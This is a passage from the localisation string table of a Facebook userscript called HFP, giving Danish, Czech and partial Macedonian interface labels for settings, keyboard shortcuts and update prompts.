/>&nbsp;<b>x</b> - Bokse<br /><br /><i>Fra sider med bladrefunktion (frem, tilbage o.s.v.)</i><br />&nbsp;<b>&lt;left arrow&gt;</b> - Forrige<br />&nbsp;<b>&lt;right arrow&gt;</b> - Næste<br />&nbsp;<b>&lt;shift&gt; + &lt;left arrow&gt;</b> - Første (når muligt)<br />&nbsp;<b>&lt;shift&gt; + &lt;right arrow&gt;</b> - Sidste (når muligt)<br /><br /><i>Under visning af album/billeder:</i><br />&nbsp;<b>a</b> - Hent alle miniaturer (når muligt)<br />&nbsp;<b>b</b> - Vis store billeder<br />&nbsp;<b>c</b> - Se kommentarer<br />&nbsp;<b>k</b> - Tilbage til album<br />&nbsp;<b>m</b> - Billeder af (person) og mig<br /><br /><i>Under visning af nyeste album og uploadede/taggede billeder:</i><br />&nbsp;<b>a</b> eller <b>r</b> - Nyeste Album<br />&nbsp;<b>m</b> eller <b>u</b> - Telefon uploads<br />&nbsp;<b>o</b> - Billeder af mig<br />&nbsp;<b>p</b> - Mine billeder<br />&nbsp;<b>t</b> eller <b>f</b> - Tagged venner',
		'ConfShortcuts' : 'Slå tastaturgenveje til.',
		'ConfSign' : 'Vis folks stjernetegn på deres profil (hvis de har oplyst en fødsesdato).',
		'ConfTopBarFixed' : 'Hold topmenuen synlig på siden, selv efter der er scrollet ned.',
		'ConfTopBarHoverOpacity' : 'Når musen er over',
		'ConfTopBarOpacity' : 'Gennemsigtighed af topmenu linien',
		'DownloadVideo' : 'Hent video',
		'ExportICalendarFile' : 'Eksportér iCalendar fil',
		'ExportICalendarFileWarning' : '(Dette vil tage lang tid, hvis du har mange venner)',
		'FacebookFixerConflict' : 'HFP vil fremover hedde HFP. På grund af navneskiftet, skal du manuelt afinstallere HFP fra dine browsere, da de to scripts ellers vil komme i konflikt med hinanden. Hvis du er usikker på hvordan man afinstallerer et Userscript, så <a %s>tryk her for instruktioner</a>.',
		'fullAlbumLoaded' : 'Hele albummet hentet',
		'Left' : 'Venstre',
		'ListeningRestarted' : 'HFP lytter efter ændringer igen.',
		'ListeningStopped' : 'HFP er stoppet med at lytte efter ændringer.\nTryk L (SHIFT + l) for at starte igen',
		'LoadingAllPhotos' : 'Henter alla billeder...',
		'loadingFullAlbum' : 'henter helt album...',
		'LoadingPic' : 'Henter billede...',
		'LoadPhotosWarning' : 'Indhentning af alle billeder tager mugligvis lang tid',
		'Months' : new Array('Januar','Februar','Marts','April','Maj','Juni','Juli','August','September','Oktober','November','December'),
		'ProtocolSkype' : 'Ring til %s med Skype',
		'ProtocolMSN' : 'Chat med %s på Windows Live',
		'ProtocolYahoo' : 'Chat med %s på Yahoo Messenger',
		'ProtocolGoogle' : 'Chat med %s på Google Talk',
		'ReloadErrorPage' : 'Tryk for at prøve igen eller vent 5 sekunder',
		'Refresh' : 'Genindlæs',
		'Remove' : 'Fjern',
		'Right' : 'Højre',
		'ShowBigPictures' : 'Vis store billeder',
		'Signs' : new Array('Stenbukken','Vandbæreren','Fiskene','Vædderen','Tyren','Tvillingerne','Krebsen','Løven','Jomfruen','Vægten','Skorpionen','Skytten'),
		'today' : 'i dag',
		'UpdateAvailable1' : 'En opdatering er tilgængelig til HFP',
		'UpdateAvailable2' : 'Vil du opdatere nu?',
		'UpdateHomepage' : 'Gå til hjemmesiden',
		'UpdateInstall' : 'Installér nu',
		'UpdateTomorrow' : 'Påmind mig i morgen',
		'yearsOld' : '%s år gammel'
	},

	// Czech - Contributed by Caken (20100823)
	cs : {
		'_language' : 'Czech',
		'AddToCalendar' : 'Přidat do kalendáře',
		'AddToGoogleCalendar' : 'Přidat do Google kalendáře',
		'all' : 'vše',
		'All' : 'Vše',
		'AllPhotosLoaded' : 'Všechny fotografie načtené',
		'Automatic' : 'Automaticky',
		'Birthday' : 'Narozeniny %s',
		'BookmarkAdd' : 'Přidej záložku',
		'BookmarkExists' : 'Tato stránka už je v záložkách.',
		'BookmarkNamePrompt' : 'Vložte jméno této záložky:\n%s',
		'BookmarksConfirmRemoval' : 'Jste si jistí, že chcete odstranit tuto záložku?',
		'BookmarksManage' : 'Spravuj záložky',
		'BookmarksRemoveSelected' : 'Odstraň vybrané záložky',
		'Bookmarks' : 'Záložky',
		'BrowserUnsupported' : 'Váš prohlížeč nepodporuje tento program.',
		'CreatingFile' : 'Vytvoření souboru',
		'Close' : 'Zavřít',
		'ConfigureFacebookFixer' : 'Nastavení - HFP',
		'ConfigureInstructions' : 'Všechny změny jsou ukládány okamžitě, ale některé se nemusí projevit na již otevřených kartách.',
		'ConfAge' : 'Zobrazit věk lidí v jejich profilech (pokud poskytli celý datum narození)',
		'ConfAlbumComments' : 'Přidá odkaz na stránku alba a ukáže všechny komentáře k danému albu.',
		'ConfApplicationWhitelist' : 'Seznam povolených aplikací - Vložte ID aplikace, kterou chcete chránit před skrytím. ID oddělujte mezerami.',
		'ConfAutoBigAlbumPictures' : 'Automaticky při otevření stránky zobrazit větší obrázky albumu',
		'ConfAutoLoadFullAlbum' : 'Automaticky načítat miniatury všech obrázků v albumu na jedné stránce',
		'ConfAutoLoadTaggedPhotos' : 'Automaticky načítat miniatury všech fotograficí s popisem na jedné stránce (karta Fotky v profilech lidí)',
		'ConfAutoReadMore' : 'Automaticky kliknout na odkazy &quot;číst dále&quot;',
		'ConfBigAlbumPictures' : 'Přidat odkaz na stránkách albumu na zobrazení větších verzí všech obrázků na této straně',
		'ConfBookmarks' : 'Přijde menu záložek do vrchní nabídky.',
		'ConfBottomBarHoverOpacity' : 'Při najetí myší',
		'ConfBottomBarOpacity' : 'Průhlednost spodního panelu s nabídkou',
		'ConfCalendarBirthDate' : 'Zahrnout narozeniny osoby do podrobnosti událostí',
		'ConfCalendarFullName' : 'Použít jméno celé jméno osoby jako název narozenin (namístno křestního jména)',
		'ConfChatDifferentiate' : 'Použít tučné písmo a kurzívu na rozlišení připojených a nečinných přátel',
		'ConfChatHideIdle' : 'Skrýt nečinné přátele',
		'ConfDelayPopupPics' : 'Vyčkat 0,5 sekundy před načtením obrázku v kontextovém okně',
		'ConfDelayPopupPicsTimeout' : 'Zpoždění před zobrazením obrázku v kontextovém okně v milisekundách (defaultně=500):',
		'ConfDownloadVideo' : 'Přidat odkaz na převzetí videí ze stránek s videem (možná potřeba <a href="http://en.wikipedia.org/wiki/Flash_Video#FLV_players" target="_blank">FLV přehrávač</a>)',
		'ConfErrorPageReload' : 'Automaticky po 5 sekundách znova načíst chybové stránky aplikácí',
		'ConfExport' : 'Pro exportování vašeho nastavení, zkopírujte následující text a uložte ho do souboru.',
		'ConfExternalPopup' : 'Externí obrázky plné velikosti v kontextovém okně <sup>beta</sup>',
		'ConfFacebookHFPLanguage' : 'Jazyk pro HFP',
		'ConfFacebookTimestamps' : 'Zobrazit časové značky Facebooku (t. j. "před 3 hodinami")',
		'ConfFBFTimestamps' : 'Přidat časové značky skriptu HFP za časové značky Facebooku (t. j. "11:45")',
		'ConfFBFTimestamps24' : 'Zobrazit časové značny skriptu HFP v 24-hodinovém formátě',
		'ConfFriendRequestCountInTitle' : 'Zobraz počet nových žádostí o přátelství v titulku stránky.',
		'ConfGoogleApps' : 'Vytvořit odkazy pro Google Calendar kompatibilní s Google Apps',
		'ConfGoogleAppsDomain' : 'Doména',
		'ConfGoogleCalendar' : 'Přidat odkazy na zařazení narozenin a událostí do aplikace <a href="http://en.wikipedia.org/wiki/Google_Calendar" target="_blank">Google Calendar</a>.',
		'ConfGoogleLanguage' : 'Jazyk pro <a href="http://en.wikipedia.org/wiki/Google_Translate" target="_blank">Google Translate</a>.',
		'ConfHideApplicationStories' : 'Skrýt v aktualitách příspěvky o aplikacích.',
		'ConfHideEventStories': 'Skrýt v aktualitách příspěvky z událostí.',
		'ConfHideFacebookCountInTitle' : 'Skrýt počet nových zpráv.',
		'ConfHideFriendStories': 'Skrýt v aktualitách příspěvky přátel.',
		'ConfHideGroupStories': 'Skrýt v aktualitách příspěvky o skupinách.',
		'ConfHideLikeStories' : 'Skrýt příspěvky uživateli xxx se líbí.',
		'ConfHideLinkStories' : 'Skrýt příspěvky o odkazech.',
		'ConfHideNoteStories' : 'Skrýt příspěvky o poznámkách.',
		'ConfHidePhotoStories' : 'Skrýt příspěvky o fotkách.',
		'ConfHideProfilePicStories' : 'Skrýt příspěvky o profilových fotkách.',
		'ConfHideRead' : 'Skrýt v aktualitách položky, které byly označené jako přečtené.',
		'ConfHideRelationshipStories' : 'Skrýt v aktualitách příspěvky o vztahu.',
		'ConfHideStatusStories' : 'Skrýt příspěvky se statusy.',
		'ConfHideVideoStories' : 'Skrýt příspěvky o videích.',
		'ConfHideWallStories' : 'Skryj příspěvky na zdi.',
		'ConfHomeBeta' : 'Zobraz Beta Tester sekci.',
		'ConfHomeChat' : 'Zobrazit část chat.',
		'ConfHomeEvents' : 'Zobrazit část Události',
		'ConfHomeFindFriends' : 'Zobrazit část Spojte se s přáteli',
		'ConfHomeLeftAlign' : 'Zarovat obsah stránky Domů doleva',
		'ConfHomeLeftColumn' : 'Zobraz levý sloupec.',
		'ConfHomeLeftColumnFixed' : 'Nech levý sloupec viditelný i při scrolování dolů.',
		'ConfHomeLink' : 'Zobraz ve vrchní nabídce odkaz na úvodní stránku.',
		'ConfHomeNavigation' : 'Zobrazit část navigace.',
		'ConfHomePokes' : 'Zobrazit část Šťouchnutí',
		'ConfHomeProfile' : 'Zobraz část Profil.',
		'ConfHomeRecommendations' : 'Zobraz doporučení (Mohli byste znát, doporučené stránky, atd.).',
		'ConfHomeRequests' : 'Zobrazit část Žádosti',
		'ConfHomeRightColumn' : 'Zobrazit pravý sloupec',
		'ConfHomeStretch' : 'Roztáhnout úvodní stránku na šířku okna prohlížeče',
		'ConfHomeStretchComments' : 'Roztáhnout komentáře na úvodní stránce.',
		'ConfiCalendar' : 'Přidat odkazy na převzetí souboru <a href="http://en.wikipedia.org/wiki/ICalendar" target="_blank">iCalendar</a> se všemi narozeninami',
		'ConfImport' : 'Pro importování nastavení přepište následující text předem exportovaným a poté klikněte na "Import".',
		'ConfInboxCountInTitle' : 'Zobrazit v názvu stránky počet nepřečtených zpráv',
		'ConfLogoutLink' : 'Přidej odhlašovací odkaz do vrchní nabídky.',
		'ConfNotificationCountInTitle' : 'Zobraz počet nových upozornění v titulku stránky.',
		'ConfNewTabSearch' : 'Při vyhledávání otevřít stisknutím Ctrl+Enter výsledky hledání na nové kartě/v novém okně',
		'ConfPageTitle' : 'Odstranit "Facebook |" z názvu všech stránek',
		'ConfPhotoPopup' : 'Větší verze fotek v kontextovém menu po najetí myší',
		'ConfPopupAutoClose' : 'Automaticky zavírat kontextová okna s obrázkem',
		'ConfPopupSmartAutoClose' : 'Zabránit automatickému uzavření kontextového okna s obrázkem',
		'ConfPopupPosition' : 'Umístění kontextového okna s obrázkem',
		'ConfProcessInterval' : 'Interval zpracování stránky v milisekundách (defaultně=1000):',
		'ConfProfileLink' : 'Zobraz ve vrchní nabídce odkaz na profil.',
		'ConfProfilePicPopup' : 'Větší verze profilových fotek v kontextovém okně po najetí myší',
		'ConfProtocolLinks' : 'Zmenit ID pro okamžitou správu na odkazy spouštějící konverzaci (Google Talk, Windows Live atd.)',
		'ConfSectionAbout' : 'O HFPu',
		'ConfSectionAdvanced' : 'Upřesnění',
		'ConfSectionEvents' : 'Narozeniny/Události',
		'ConfSectionImportExport' : 'Import/Export',
		'ConfSectionFeeds' : 'Příspěvky',
		'ConfSectionHomePage' : 'Stránka Doma',
		'ConfSectionLiveFeed' : 'Aktuality',
		'ConfSectionMenu' : 'Nabídky/Chat',
		'ConfSectionOther' : 'Další možnosti',
		'ConfSectionPageTitle' : 'Titulek stránky',
		'ConfSectionPictures' : 'Obrázky',
		'ConfSectionShortcuts' : 'Klávesové zkratky',
		'ConfSecureLinks' : 'Přesměrovat odkazy Facebooku na stránky HTTPS',
		'ConfShortcutList' : '<b>Klávesové zkratky</b> (rozlišují se malá/velká písmena):<br /><br /><i>Z libovolné stránky:</i><br />&nbsp;<b>A</b> - Alba/fotky<br />&nbsp;<b>B</b> - Přepnout seznam přátel (online přátel)<br />&nbsp;<b>C</b> - Konfigurace skriptu HFP<br />&nbsp;<b>D</b> - Narozeniny<br />&nbsp;<b>E</b> - Události<br />&nbsp;<b>F</b> - Přátelé<br />&nbsp;<b>H</b> - Domů<br />&nbsp;<b>I</b> - Přijaté zprávy<br />&nbsp;<b>K</b> - Přidej záložku<br />&nbsp;<b>L</b> - Odhlášení (po odhlášení stiskněte Enter)<br />&nbsp;<b>N</b> - Upozornění<br />&nbsp;<b>P</b> - Váš profil<br />&nbsp;<b>R</b> - Žádosti<br />&nbsp;<b>S</b> - Přeskočit na pole Hledat<br />&nbsp;<b>T</b> - Přeložit vybraný text<br />&nbsp;<b>?</b> - Zobrazit informace o ladění skriptu HFP<br />&nbsp;<b>&lt;escape&gt;</b> - Zavřít kontextová okna vytvořené skriptem HFP<br /><br /><i>Ze stránky Domů (filtry)</i>:<br />&nbsp;<b>a</b> - Stránky<br />&nbsp;<b>f</b> - Aktuality<br />&nbsp;<b>g</b> - Skupiny<br />&nbsp;<b>l</b> - Odkazy<br />&nbsp;<b>n</b> - Novinky<br />&nbsp;<b>p</b> - Fotky<br />&nbsp;<b>s</b> nebo <b>u</b> - Co dělají ostatní<br />&nbsp;<b>t</b> - Poznámky<br />&nbsp;<b>v</b> - Videa<br /><br /><i>Z profilů</i>:<br />&nbsp;<b>i</b> - Informace<br />&nbsp;<b>p</b> - Fotky<br />&nbsp;<b>w</b> - Zeď<br />&nbsp;<b>x</b> - Kontejner<br /><br /><i>Ze stránek s navigací (dozadu, dopredu atd.)</i><br />&nbsp;<b>&lt;levá šipka&gt;</b> - Předchozí<br />&nbsp;<b>&lt;pravá šipka&gt;</b> - Následující<br />&nbsp;<b>&lt;shift&gt; + &lt;levá šipka&gt;</b> - První (pokud je dispozici)<br />&nbsp;<b>&lt;shift&gt; + &lt;pravá šipka&gt;</b> - Poslední (pokud je k dispozici)<br /><br /><i>Při prohlížení alb/fotek:</i><br />&nbsp;<b>a</b> - Načítat všechny miniatury (pokud je k dispozici)<br />&nbsp;<b>b</b> - Zobrazit velké obrázky<br />&nbsp;<b>c</b> - Zobrazit komentáře<br />&nbsp;<b>k</b> - Zpět do alba<br />&nbsp;<b>m</b> - Fotky (osoby) a moje<br /><br /><i>Při prohlížení nejnovějších alb a nahraných/označených fotek:</i><br />&nbsp;<b>a</b> nebo &nbsp;<b>r</b> - Nejnovější alba<br />&nbsp;<b>m</b> nebo &nbsp;<b>u</b> - Nahrané z mobilu<br />&nbsp;<b>o</b> - Fotky mé osoby<br />&nbsp;<b>p</b> - Mé fotky<br />&nbsp;<b>t</b> nebo &nbsp;<b>f</b> - Označení přátelé',
		'ConfShortcuts' : 'Povolit klávesové zkratky',
		'ConfSign' : 'Zobrazit znamení lidí v jejich profilu (pokud uvedli svůj datum narození)',
		'ConfTopBarFixed' : 'Vždy zobrazit vrchní panel s nabídkou - i při posouvání stránky',
		'ConfTopBarHoverOpacity' : 'Při najetí myší',
		'ConfTopBarOpacity' : 'Průhlednost vrchního panelu s nabídkou',
		'DownloadVideo' : 'Stáhnout video',
		'ExportICalendarFile' : 'Exportovat soubor iCalendar',
		'ExportICalendarFileWarning' : '(Pokud máte mnoho přátel, může to chvíli trvat.)',
		'FacebookFixerConflict' : 'Facebook Fifex je nyní znám jako HFP.<br /><br />Protože se změnilo jméno, musíte manuálně odinstalovat Facebook Fixer z vašeho prohlížeče.<br /><br />Pokud si nevíte jak na to <a %s>pokračujte zde</a>.',
		'fullAlbumLoaded' : 'celý album je načtený',
		'Import' : 'Import',
		'ImportConfirm' : 'Opravdu chcete importovat toto nastavení?\nStávající nastavení bude ztraceno.',
		'ImportFailure' : 'Při importování nastavení došlo k chybě.',
		'ImportSuccess' : 'Import kompletní. Chcete aktualizovat stránku?',
		'Left' : 'Vlevo',
		'LoadingAllPhotos' : 'Načítají sa všechny fotky...',
		'loadingFullAlbum' : 'Načítá se celý album...',
		'LoadingPic' : 'Načítá se obrázek...',
		'LoadPhotosWarning' : 'Načítání všech fotek může chvíli trvat',
		'Months' : new Array('Leden','Únor','Březen','Duben','Květen','Červen','Červenec','Srpen','Září','Říjen','Listopad','Prosinec'),
		'ProtocolSkype' : 'Volat %s pomocí Skype',
		'ProtocolMSN' : 'Chatovat s %s pomocí Windows Live',
		'ProtocolYahoo' : 'Chatovat s %s pomocí Yahoo Messenger',
		'ProtocolGoogle' : 'Chatovat s %s pomocí Google Talk',
		'ReloadErrorPage' : 'Klikněte na Zkusit znovu nebo vyčkejte 5 sekund',
		'Refresh' : 'Obnovit',
		'Remove' : 'Odstranit',
		'Right' : 'Vpravo',
		'ShowBigPictures' : 'Zobrazit velké obrázky',
		'Signs' : new Array('Kozoroh','Vodnář','Ryba','Beran','Býk','Blíženci','Rak','Lev','Panna','Váhy','Štír','Střelec'),
		'today' : 'dnes',
		'Translators' : 'Překladatelé',
		'UpdateAvailable1' : 'K dispozici je aktualizace skriptu HFP.',
		'UpdateAvailable2' : 'Chcete aktualizovat nyní?',
		'UpdateHomepage' : 'Přejít na domovskou stránku',
		'UpdateInstall' : 'Nainstalovat',
		'UpdateTomorrow' : 'Připomenout zítra',
		'ViewAlbumComments' : 'Ukaž komentáře k albu',
		'yearsOld' : '%s let'
	},
	
	// Macedonian - Contributed by Goce Manevski (20100628)
	mk : {
		'_language' : 'Macedonian',
		'AddToCalendar' : 'Додади во Калентар',
		'AddToGoogleCalendar' : 'Додади во Google Калентар',
		'all' : 'сите',
		'All' : 'Сите',
		'AllPhotosLoaded' : 'Сите фотографии се вчитани',
		'Automatic' : 'Автоматски',
		'Birthday' : '%s\'s Роденден',
		'BookmarkAdd' : 'ДОдади нов обележувач',
		'BookmarkConfirmRemoval' : 'Дали си сигурен дека сакаш да избришеш обележувач "%s"?',
		'BookmarkDoesNotExist' : 'This page has not been bookmarked.\n\nGo to the page you want removed and try again.',
		'BookmarkExists' : 'Веќе има обележувач за оваа страница.\n\nОди до страницата што сакаш да ја обележиш и обиди се повторно.',
		'BookmarkNamePrompt' : 'Внеси име за овој обележувач:\n%s',
		'BookmarkRemove' : 'Избриши обележувач',
		'Bookmarks' : 'Обележувачи',
		'BrowserUnsupported' : 'Твојот пребарувач не ја поддржува опцијата.',
		'CreatingFile' : 'Креирање Датотека',
		'Close' : 'Затвори',
		'ConfigureFacebookFixer' : 'Конфигурирај го HFP',
		'ConfigureInstructions' : 'Сите промени се веднаш зачувани, но некои промени нема да работат во веќе отворените табови.',
		'ConfAge' : 'Покажи ги годините на луѓе\-то на нивните профили (ако го имаат објавено целиот датум на раѓање).',
		'ConfApplicationWhitelist' : 'Апликациска белалиста - Внеси сметки од апликациите за да ги покажеш ако биле скриени. Раздели ги сметките со празно место.',
		'ConfAutoBigAlbumPictures' : 'Автоматски прикажувај големи албум слики кога ќе се отвори страницата.',
		'ConfAutoLoadFullAlbum' : 'Автоматски вчитувај мали сликички за сите слики во албумот на една страница.',
		'ConfAutoLoadTaggedPhotos' : 'Автоматски вчитувај мали сликички за сите обележани слики на една страница (Таб од слики на профилите на луѓе\-то).',
		'ConfAutoReadMore' : 'Автоматски кликни на "прочитај повеќе" линковите.',
		'ConfBigAlbumPictures' : 'Додади линк на албум страниците за да се покаже голема верзија на сите фотографии на таа страница.',
		'ConfBookmarks' : 'Додади подмени на горното топ мени.',
		'ConfBottomBarHoverOpacity' : 'На обележување со глувчето',
		'ConfBottomBarOpacity' : 'Проѕирност на долниот мени бар',
		'ConfCalendarBirthDate' : 'Вклучи го роденден\-от на лицето во детали за настапот.',
		'ConfCalendarFullName' : 'Користи го целото име на човек\-от како наслов за родендени (наместо само име).',
		'ConfChatDifferentiate' : 'Користи здебелено и искосено за разлика повеѓу достапните и отсутните контакти.',
		'ConfChatHideIdle' : 'Сокриј ги отсутните контакти.',
		'ConfDelayPopupPics' : 'Додади кратко задоцнување пред покажување скокачки фотографии.',
		'ConfDelayPopupPicsTimeout' : 'Задоцнување пред покажување скокачки фотографии, во милисекунди (стандард=500):',
		'ConfDownloadVideo' : 'Додади линк за превземања на видеата од видео страниците. (Може ќе ти треба <a href="http://en.wikipedia.org/wiki/Flash_Video#FLV_players" target="_blank">FLV player</a>)',
		'ConfErrorPageReload' : 'Автоматски повторно вчитувај ги апликациите на страниците со грешки по 5 секунди.',
		'ConfExport' : 'За да ги изнесеш подесувањата, копирај го текстот предходно и зачувај го во датотека.',
		'ConfExternalPopup' : 'Скокачки целосни верзии на надворешни фотографии. <sup>beta</sup>',
		'ConfFacebookHFPLanguage' : 'Јазик за HFP',
		'ConfFacebookTimestamps' : 'Прикажи Facebook маркер за времето (eg. "3 часа старо").',
		'ConfFBFTimestamps' : 'Додади HFP маркер за времето по Facebook маркерот за време (eg. "11:45").',
		'ConfFBFTimestamps24' : 'Прикажи HFP маркер за време во 24-часовен формат.',
		'ConfFriendRequestCountInTitle' : 'Прикажи број од нови барања за пријатели на насловот на страницата.',
		'ConfGoogleApps' : 'Креирај Google Календар линкови компатибилни со Google Апликации.',
		'ConfGoogleAppsDomain' : 'Домен',
		'ConfGoogleCalendar' : 'Дидаду линкови за да додадеш роденден и настани во <a href="http://en.wikipedia.org/wiki/Google_Calendar" target="_blank">Google Calendar</a>.',
		'ConfGoogleLanguage' : 'Јазик за <a href="http://en.wikipedia.org/wiki/Google_Translate" target="_blank">Google Translate</a>',
		'ConfHideApplicationStories' : 'Сокриј ги приказните за апликациите.',
		'ConfHideEventStories' : 'Сокриј ги приказните за настаните.',
		'ConfHideFriendStories' : 'Сокриј ги приказните за пријателите.',
		'ConfHideGroupStories' : 'Сокриј ги приказните за групите.',
		'ConfHideLikeStories' : 'Сокриј ги приказните за "ми се допаѓа".',
		'ConfHideLinkStories' : 'Сокриј ги приказните за линковите.',
		'ConfHideNoteStories' : 'Сокриј ги приказните за белешките.',
		'ConfHidePhotoStories' : 'Сокриј ги приказните за фотографиите.',
		'ConfHideProfilePicStories' : 'Сокриј ги приказните за профил фотографиите.',
		'ConfHideRead' : 'Сокриј работи во новостите одкако ќе бидат обележани за прочитаните.',
		'ConfHideRelationshipStories' : 'Сокриј ги приказните за статус-от за врска.',
		'ConfHideStatusStories' : 'Сокриј ги приказните за статусите.',
		'ConfHideVideoStories' : 'Сокриј ги приказните за видеата.',
		'ConfHideWallStories' : 'Сокриј ги приказните за ѕидот.',
		'ConfHomeChat' : 'Покажи Разговор секција.',
		'ConfHomeEvents' : 'Покажи Настани секција.',
		'ConfHomeFindFriends' : 'Покажи Поврзан со пријатели секција.',
		'ConfHomeLeftAlign' : 'Left-align the contents of the home page.',
		'ConfHomeLeftColumn' : 'Покажи ја левата колона.',
		'ConfHomeLeftColumnFixed' : 'Задржи ја левата колона видлива, по лизгањето надоле.',
		'ConfHomeLink' : 'Покажи Почетна линк во топ мени барот.',
		'ConfHomePeopleYouMayKnow' : 'Покажи Сугестии секција.',
		'ConfHomeNavigation' : 'Покажи Навигација секција.',
		'ConfHomePokes' : 'Покажи Боцкања секција.',
		'ConfHomeProfile' : 'Покажи Профил секција.',
		'ConfHomeRequests' : 'Покажи Барања секција.',
		'ConfHomeRightColumn' : 'Покажи десна колона.',
		'ConfHomeStretch' : 'Растегни ја Почетната страница на целата ширина на пребарувачот.',
		'ConfiCalendar' : 'Додади линкови за превземање на <a href="http://en.wikipedia.org/wiki/ICalendar" target="_blank">iCalendar</a> датотека со сите родендени.',
		'ConfImport' : 'За да ги внесеш твоите прилагодувања подоцна, замени го текстот погоре со текстот кој ти е зачуван предходно и кликни "Внеси".',
		'ConfInboxCountInTitle' : 'Прикажи број на нови пораки во насловот на страницата.',
		'ConfLogoutLink' : 'Додади Одјави се линк во топ мени барот.',
		'ConfNotificationCountInTitle' : 'Прикажи број на нови нотификации во насловот на страницата.',
		'ConfNewTabSearch' : 'Направи ги отворени пребарувањата во нов таб/прозорец кога притискам CTRL + Enter за да барам.',
		'ConfPageTitle' : 'Избриши "Facebook |" од насловот на секоја страница.',
		'ConfPhotoPopup' : 'Скокачки поголеми верзии на фотографии при обележување со глувчето.',
		'ConfPopupAutoClose' : 'Затвори ги скокачките фотографии автоматски.',
		'ConfPopupSmartAutoClose' : 'Спречи автоматски исклучување на скокачките фотографии ако обележувачот на глувчето е над нив',
		'ConfPopupPosition' : 'Позиција за скокачки фотографии',
		'ConfProcessInterval' : 'Интервал за обработување страница, во милисекунди (поставено=1000):',
		'ConfProfileLink' : 'Прикажи Профил линк во топ мени барот.',
		'ConfProfilePicPopup' : 'Скокачки големи верзии на профил фотографии со обележување со глувчето',
		'ConfProtocolLinks' : 'Вклучи месинџер сметки на профилите со линкови за почеток на разговор со нив (Google Talk, Windows Live и тн).',
		'ConfSectionAbout' : 'За HFP',
		'ConfSectionAdvanced' : 'Напредно',
		'ConfSectionEvents' : 'Родендени/Настани',
		'ConfSectionImportExport' : 'Внеси/Изнеси',
		'ConfSectionFeeds' : 'Извори',
		'ConfSectionHomePage' : 'Почетна страница',
		'ConfSectionLiveFeed' : 'Новости',
		'ConfSectionMenu' : 'Мениа/Разговор',
		'ConfSectionOther' : 'Други Опции',
		'ConfSectionPageTitle' : 'Наслов на страница',
		'ConfSectionPictures' : 'Фотографии',
		'ConfSectionShortcuts' : 'Кратенки за тастатура',
		'ConfSecureLinks' : 'Сила на Facebook линковите до точка до HTTPS страници.',
		'ConfShortcutList' : '<b>Кратенки за тастатура</b> (case sensitive):<br /><br /><i>Од секоја страница:</i><br />&nbsp;<b>A</b> - Albums/photos<br />&nbsp;<b>B</b> - Вклучи корисници (вклучени пријатели)<br />&nbsp;<b>C</b> - HFP Конфигурација<br />&nbsp;<b>D</b> - Родендени<br />&nbsp;<b>E</b> - Настани<br />&nbsp;<b>F</b> - Пријатели<br />&nbsp;<b>H</b> - Почетна страница<br />&nbsp;<b>I</b> - Сандаче<br />&nbsp;<b>K</b> - Add Bookmark<br />&nbsp;<b>L</b> - Select the logout link (press Enter afterwards to log out)<br />&nbsp;<b>N</b> - Notifications<br />&nbsp;<b>P</b> - Your profile<br />&nbsp;<b>R</b> - Requests<br />&nbsp;<b>S</b> - Jump to the search field<br />&nbsp;<b>T</b> - Translate selected text<br />&nbsp;<b>?</b> - Show HFP debug info<br />&nbsp;<b>&lt;escape&gt;</b> - Close pop-ups created by HFP<br /><br /><i>From the home page (filters)</i>:<br />&nbsp;<b>a</b> - Pages<br />&nbsp;<b>f</b> - Live feed<br />&nbsp;<b>g</b> - Groups<br />&nbsp;<b>l</b> - Links<br />&nbsp;<b>n</b> - News feed<br />&nbsp;<b>p</b> - Photos<br />&nbsp;<b>s</b> or <b>u</b> - Status updates<br />&nbsp;<b>t</b> - Notes<br />&nbsp;<b>v</b> - Videos<br /><br /><i>From profiles</i>:<br />&nbsp;<b>i</b> - Info<br />&nbsp;<b>p</b> - Photos<br />&nbsp;<b>w</b> - Wall<br />&nbsp;<b>x</b> - Boxes<br /><br /><i>From pages with pagination (previous, next, etc)</i><br />&nbsp;<b>&lt;left arrow&gt;</b> - Previous<br />&nbsp;<b>&lt;right arrow&gt;</b> - Next<br />&nbsp;<b>&lt;shift&gt; + &lt;left arrow&gt;</b> - First (when available)<br />&nbsp;<b>&lt;shift&gt; + &lt;right arrow&gt;</b> - Last (when available)<br /><br /><i>While viewing albums/photos:</i><br />&nbsp;<b>a</b> - Load all thumbnails (when available)<br />&nbsp;<b>b</b> - Show big pictures<br />&nbsp;<b>c</b> - View comments<br />&nbsp;<b>k</b> - Back to album<br />&nbsp;<b>m</b> - Photos of (person) and me<br /><br /><i>While viewing recent albums and uploaded/tagged photos:</i><br />&nbsp;<b>a</b> or &nbsp;<b>r</b> - Recent Albums<br />&nbsp;<b>m</b> or &nbsp;<b>u</b> - Mobile uploads<br />&nbsp;<b>o</b> - Photos of me<br />&nbsp;<b>p</b> - My Photos<br />&nbsp;<b>t</b> or &nbsp;<b>f</b> - Tagged friends',
		'ConfShortcuts' : 'Вклучи кратенки за тастатура.',
		'ConfSign' : 'Пркажи хороскопски значи на луѓе\-то на нивните профили (Ако ја објавиле таа информација).',
		'ConfTopBarFixed' : 'Зачувај го горниот мени бар на екранот секогаш, и по лизгањето доле.',
		'ConfTopBarHoverOpacity' : 'При обележување со глувчето',
		'ConfTopBarOpacity' : 'Проѕирност на горниот мени бар',
		'DownloadVideo' : 'Превземи Видео',
		'ExportICalendarFile' : 'Изнеси iCalendar датотека',
		'ExportICalendarFileWarning' : '(Тоа ќе потрае ако имаш многу пријатели)',
		'FacebookFixerConflict' : 'Facebook Fixer е сега HFP.<br /><br />За промена на име треба сами да го избришете Facebook Fixer од вашиот пребарувач, или двете скрипти ќе создаваат проблем една на друга.<br /><br />Ако не си сигурен како да ја избришеш скриптата, <a %s>кликни тука за инструкции</a>.',
		'fullAlbumLoaded' : 'целиот албум е вчитан',
		'Import' : 'Внеси',
		'ImportConfirm' : 'Дали си сигурен дека сакаш да ги внесеш овие прилагодувања?\nТвоите сегашни прилагодувања ќе бидат изгубени.',
		'ImportFailure' : 'се појави грешка додека ги внесуваше твоите прилагодувања.',
		'ImportSuccess' : 'Внесувањето е завршено. Дали сакаш да ја освежиш страницата?',
		'Left' : 'Лево',
		'LoadingAllPhotos' : 'Се вчитуваат сите фотографии...',
		'loadingFullAlbum' : 'Се вчитува целиот албум...',
		'LoadingPic' : 'Се вчитува фотографијата...',
		'LoadPhotosWarning' : 'Вчитувањето на сите фотографии може да потрае',
		'Months' : Array('Јануари','Фебруари','Март','Април','Мај','Јуни','Јули','Август','Септември','Октомври','Ноември','Декември'),
		'ProtocolSkype' : 'Јави се %s преку Skype',
		'ProtocolMSN' : 'Разговарај со %s преку Windows Live',
